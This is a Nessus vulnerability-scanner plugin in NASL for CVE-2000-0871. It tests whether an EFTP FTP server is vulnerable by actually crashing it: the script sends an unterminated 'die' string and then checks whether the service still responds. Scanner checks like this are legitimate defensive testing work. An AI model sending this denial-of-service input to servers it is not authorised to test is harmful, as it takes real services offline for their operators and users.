#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10510);
 script_bugtraq_id(1677);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0871");
 script_xref(name:"OSVDB", value:"409");
 
 script_name(english:"EFTP Newline String Handling Remote DoS");
 script_summary(english:"Crashes the remote FTP server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The FTP server running on the remote host has a denial of service\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of EFTP running on the remote host has a denial of service\n",
     "vulnerability.  Sending data without a trailing carriage return causes\n",
     "the service to crash."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-09/0089.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to EFTP 2.0.5.316 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 # script_exclude_keys("ftp/false_ftp");
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(! get_port_state(port)) exit(0);

if (get_kb_item('ftp/'+port+'/broken') || 
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);

r = ftp_recv_line(socket:soc);
if(!r)
{
  close(soc); exit(0);
}
  
 send(socket:soc, data:"die");
 close(soc);

for (i = 0; i < 3; i ++)
{
 sleep(1);
 soc = open_sock_tcp(port);
 if (soc) break;
}

if (! soc)
{
  security_warning(port);
  exit(0);
}

r = ftp_recv_line(socket:soc, retry: 3);
ftp_close(socket: soc);

if (strlen(r) > 0) exit(0);

soc = open_sock_tcp(port);
if (soc)
{
 r2 = ftp_recv_line(socket:soc, retry: 3);
 if (strlen(r2) > 0)
 {
  ftp_close(socket: soc);
  exit(0);
 }
 else
  close(soc);
}

if (soc)
 security_warning(port, extra: '\nThe TCP port is still open but the server does not answer any more.\n');
else
  security_warning(port, extra: '\nThe TCP port is now closed.\n');

